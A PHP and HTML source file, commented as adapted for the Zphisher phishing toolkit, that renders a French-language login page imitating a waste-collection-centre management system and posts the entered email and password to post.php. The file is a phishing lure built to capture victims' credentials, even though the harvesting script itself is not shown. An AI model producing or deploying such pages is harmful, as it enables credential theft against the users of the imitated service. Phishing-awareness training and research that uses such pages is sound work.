<?php
// Adapted login.php for Zphisher
session_start();

$error = $_SESSION['error'] ?? null;
unset($_SESSION['error']);
?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      min-height: 100vh;
      background: radial-gradient(circle at center, #25255b 0%, #0a0a3b 55%, #050527 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
    }

    .login-card {
      width: 455px;
      max-width: 92%;
      background: rgba(36, 36, 78, 0.95);
      border-radius: 26px;
      padding: 40px 38px 34px;
      box-shadow:
        0 0 40px rgba(0, 255, 255, 0.12),
        0 0 90px rgba(0, 255, 255, 0.14);
      border: 1px solid rgba(0, 255, 255, 0.08);
    }

    .header {
      text-align: center;
      margin-bottom: 34px;
    }

    .logo-row {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 14px;
      margin-bottom: 8px;
    }

    .logo {
      font-size: 44px;
      color: #22e5dc;
    }

    .title {
      font-size: 42px;
      font-weight: 700;
      color: #39cfff;
      line-height: 1;
    }

    .subtitle {
      color: rgba(255,255,255,0.75);
      font-size: 17px;
      margin-top: 10px;
    }

    .form-group {
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 700;
      letter-spacing: 1.6px;
      color: #17ffe8;
      margin-bottom: 12px;
      text-transform: uppercase;
    }

    input {
      width: 100%;
      height: 52px;
      border-radius: 14px;
      border: 2px solid rgba(0, 255, 255, 0.45);
      background: rgba(58, 58, 108, 0.65);
      color: white;
      padding: 0 20px;
      font-size: 18px;
      outline: none;
      transition: 0.25s ease;
    }

    input::placeholder {
      color: rgba(255,255,255,0.45);
    }

    input:focus {
      border-color: #22fff3;
      box-shadow: 0 0 18px rgba(34, 255, 243, 0.18);
    }

    .btn {
      width: 100%;
      height: 56px;
      border: none;
      border-radius: 16px;
      background: linear-gradient(90deg, #1ee7d8 0%, #5c88f4 100%);
      color: #000;
      font-size: 18px;
      font-weight: 800;
      letter-spacing: 2px;
      cursor: pointer;
      margin-top: 10px;
      box-shadow:
        0 0 20px rgba(44, 255, 246, 0.25),
        0 0 35px rgba(44, 255, 246, 0.18);
      transition: transform 0.2s ease, opacity 0.2s ease;
      text-transform: uppercase;
    }

    .btn:hover {
      transform: translateY(-1px);
      opacity: 0.96;
    }

    .links {
      text-align: center;
      margin-top: 18px;
      font-size: 16px;
      font-weight: 700;
      color: #12ffe8;
    }

    .links a {
      color: #12ffe8;
      text-decoration: none;
    }

    .links a:hover {
      text-decoration: underline;
    }

    .alert {
      background: rgba(255, 70, 70, 0.15);
      border: 1px solid rgba(255, 70, 70, 0.35);
      color: #ffd2d2;
      padding: 12px 14px;
      border-radius: 12px;
      margin-bottom: 18px;
      font-size: 14px;
    }

    @media (max-width: 520px) {
      .login-card {
        padding: 30px 22px 26px;
      }

      .title {
        font-size: 34px;
      }

      .subtitle {
        font-size: 15px;
      }
    }
  </style>
</head>
<body>

  <div class="login-card">
    <div class="header">
      <div class="logo-row">
        <div class="logo">🔐</div>
        <div class="title">Connexion</div>
      </div>
      <div class="subtitle">Système de gestion des déchèteries</div>
    </div>

    <?php if ($error): ?>
      <div class="alert"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <form method="POST" action="post.php">
      <div class="form-group">
        <label for="email">Email</label>
        <input
          type="email"
          id="email"
          name="email"
          placeholder="votre@email.fr"
          required
        >
      </div>

      <div class="form-group">
        <label for="password">Mot de passe</label>
        <input
          type="password"
          id="password"
          name="password"
          placeholder="••••••••"
          required
        >
      </div>

      <button type="submit" class="btn">Se connecter</button>
    </form>

    <div class="links">
      Pas de compte ? <a href="#">S'inscrire</a>
      &nbsp;|&nbsp;
      <a href="#">← Retour à l'accueil</a>
    </div>
  </div>

</body>
</html>
